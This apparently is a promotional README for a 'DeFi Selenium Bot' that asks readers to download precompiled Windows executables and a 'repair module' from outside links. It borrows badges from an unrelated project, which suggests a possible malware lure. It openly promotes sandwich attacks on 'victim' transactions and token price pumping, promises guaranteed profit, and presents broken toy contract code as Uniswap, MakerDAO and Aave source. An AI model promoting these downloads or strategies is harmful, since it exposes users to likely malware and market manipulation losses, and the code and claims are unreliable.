<h1 align="center">Defi Bot v1.37</h1>
<p align="center"><b>DeFi trading bot</b></p>

<p align="center">
  <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a>
  <a href="https://codecov.io/gh/SockTrader/SockTrader"><img src="https://codecov.io/gh/SockTrader/SockTrader/branch/master/graph/badge.svg" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=reliability_rating" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=sqale_rating" /></a>
  <a href="https://circleci.com/gh/SockTrader"><img src="https://circleci.com/gh/SockTrader/SockTrader/tree/master.svg?style=shield" alt="Build status"></a>
  <a href="https://codeclimate.com/github/SockTrader/SockTrader/maintainability"><img src="https://api.codeclimate.com/v1/badges/19589f9237d31ca9dcf6/maintainability" /></a>
</p>

<p align="center"><b>Join the community <a href="t.me/seleniumdefitrade"><img valign="middle" src="https://img.shields.io/badge/Slack-4A154B?style=for-the-badge&logo=slack" alt="Telegram"></a></b></p>

<p align="center">Selenium Bot will allow you not to risk your assets, increase your profit from your purchases and transactions, and manage your assets like a real Jedi master</p>

> Work on MAC OS & Windows

> This Bot, a DeFi Trading bot for ETH, BSC, AVAX, MATIC, FTM, Harmony, Metis, CRONOS, KCC, VELAS, Pulsechain, Venom, Kaikas, Milkomeda, Solana and more, can Swap, Sniping and Arbitrage

## Download

1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)

2: Install Actual Precompile Release x32 / x64 👇

Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

# Any questions?

+ Discord - taaafeth

# Mission

+ Optimize profits
+ Minimize risks
+ Make DeFi more accessible and profitable for all

# Algorithms

## Snipe new tokens at listing

The bot monitors new listings and analyzes tokens to determine their growth potential. When a promising token is found, the bot automatically places a buy order to purchase it at a favorable price. The tokens can then be sold when a certain profit is achieved or after a certain period of time.

## Instant trading & Mempool Stream

When you trade manually through trust wallet or metamask wallets, you spend 20 to 60 seconds on the token verification and transaction confirmation processes. With our bot, the processes of selling and buying is instant, because they go directly to the network of the validator.

## Scam protection

Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token.

## Profitable liquidity farming

EIP-4844 hardfork Dercun is implemented into the bot, which makes the average transaction cost go down to 0.3$ ETH. Using the Selenium Bot, you can add your project's address to be added to the trading and swap pool. By choosing DEX's where the liquidity pool has a high trading volume on the market, using the bot, you can pump the token price due to liquidity farming because of the swap with minimal commission:

+ Buy token A when its price is below the target.
+ Sell token A when its price is above the target.
+ Regulate the ratio of tokens A and B to maintain the target ratio

## Automation of BUY THE DIP and use TRAILING STOP LOSS strategy

By choosing the target asset for trading we can determine the desired drawdown level for buying (BUY THE DIP) and the trailing stop loss level (Trailing Stop Loss), the bot will continuously track the price of the target asset. If the price (% of which you have chosen) of the asset falls below the drawdown level, the bot automatically buys a predetermined number of assets, after buying the asset, the bot sets a trailing stop loss at a certain distance from the current price. If the asset price falls and reaches the trailing stop loss level (% of which you have chosen), the bot automatically sells all available assets. After selling the assets, the bot waits for the next drawdown to restart the strategy.

Customizable features:

+ Drawdown level: Define the desired drawdown level at which you want to buy assets.
+ Trailing stop loss level: Set the distance between the trailing stop loss and the current asset price.
+ Position size: Determine the number of assets you want to buy when the strategy is triggered.

## Sniping

After selecting the target exchanges and tokens for sniping. Determine the desired investment amount and slippage percentage. The bot will continuously start tracking new listings on target exchanges. After analyzing the fundamental indicators of new tokens, such as the team, tokenomics and growth potential, when you find a promising token, the bot automatically places a buy order for the specified investment amount with the desired slippage percentage. The bot starts tracking the execution of the buy order in real time. After the buy order is executed, the bot can automatically sell the tokens when a certain profit is reached or after a certain period of time.

Customizable features:

+ Target exchanges: Select the exchanges on which you want to search for new tokens.
+ Target tokens: Define the criteria for selecting tokens for sniping (e.g., industry, market capitalization)
+ Investment amount: Set the investment amount for each snipe.
+ Slippage percentage: Specify the acceptable slippage percentage for buy orders.
+ Sell strategy: Configure the sell strategy, including target profit or holding period.

## Mempool Stream

Let's say someone broadcasts a transaction with a Uniswap order to the public mempool. Any transaction that is directly submitted to the blockchain typically ends up in the public mempool. The bot gains access to this data by establishing a websocket connection to a node provider.

## Integration with DeFiExchange

To add more DEX, we came up with a way to decode all transactions by reading the specifications of their functions. Bot accomplish this by tracing the transaction call. A trace call that starts a transaction on a block state that the caller specifies, and will return values such as: gas used, call stack, logs returned, etc. We use the eth_traceCall method on Geth to find out which DEX's pools are affected by pending transactions - by "affected" we mean which pools' states change as a result of the call.

## A little bit about trading

The trading works by tracking all the transactions in all the DEX's using our system: the bot buys before someone else and sells just after him to get guaranteed profit. If more people buy a certain token its price goes up, the bot groups them in "front", "victim" and "back" transaction bundles and figures out: the maximum amount of tokens you can buy before the victim making sure that the victim transaction won't revert (transactions may revert because of the slippage tolerance levels that users set when using the Uniswap V2 Router contract (for example)) the maximum profit we get.


# DEXs the DeFi Selenium Bot Integrates With

uniswap, shibaswap, pancakeswap, sushiswapbsc, pancakeswaptestnet, traderjoe, sushiswapavax, pangolin, pinkswap, biswap, orbitalswap, pulsextestnet, babyswap, tethys, bakeryswap, apeswap, sushiswapeth, turtleswap, sushiswaparbitrum, degenswap, trisolaris, solarbeam, stellaswap, uniswaptestnet, kuswap, mojitoswap, koffeeswap, dogeswap, yodeswap, fraxswap, quickswap_dogechain, hebeswap, spookyswap, tombswap, wagyuswap, klayswap, sushiswapftm, protofi, spiritswap, quickswap, matic-meerkat, tetuswap, sushiswapmatic, polygon-apeswap, waultswap, cronos-vvs, cronos-meerkat, cronos-crona, viperswap, milkyswap, pangolin, serum, baseswap, uniswapv2-base, sushiswaparbitrum, shibaswap.

# Networks DeFi Selenium Trade Bot works with

Ethereum, EVM, PoW, THORChain, Elk Finance, Layer-2, Terra, BSC.

# Open-source

some examples of smart contract codes

## Uniswap smart contract code

```
function swap(address assetIn, address assetOut, uint256 amountIn, uint256 amountOutMin) public {
    // Get the liquidity pool for the pair of assets
    Pool pool = pools[assetIn][assetOut];

    // Check if there are enough assets to fulfill the swap
    require(pool.balance[assetIn] >= amountIn);

    // Execute the swap
    pool.balance[assetIn] -= amountIn;
    pool.balance[assetOut] += amountOutMin;

    // Send the assets to the recipient
    IERC20(assetOut).transfer(msg.sender, amountOutMin);
}
```

## MakerDAO smart contract code

```
function createDAI(address asset, uint256 amount) public {
    // Check if there is enough collateral to create DAI
    require(collateralValue[asset] >= amount);

    // Create DAI
    dai.mint(msg.sender, amount);

    // Deposit the collateral
    collateral[msg.sender][asset] += amount;
}
```

## Aave smart contract code

```
function borrow(address asset, uint256 amount) public {
    // Check if there are enough assets in the lending pool to fulfill the borrow
    require(pools[asset].balance >= amount);

    // Execute the borrow
    pools[asset].balance -= amount;
    balances[msg.sender][asset] += amount;

    // Set the interest rate
    interestRates[msg.sender][asset] = pools[asset].interestRate;
}
```

# Stay with us

+ [Web-site](https://seleniumdefi.com)
+ [Telegram](t.me/seleniumdefitrade)
+ [Twitter](https://x.com/SlmDefi)
+ [Youtube](Soon)
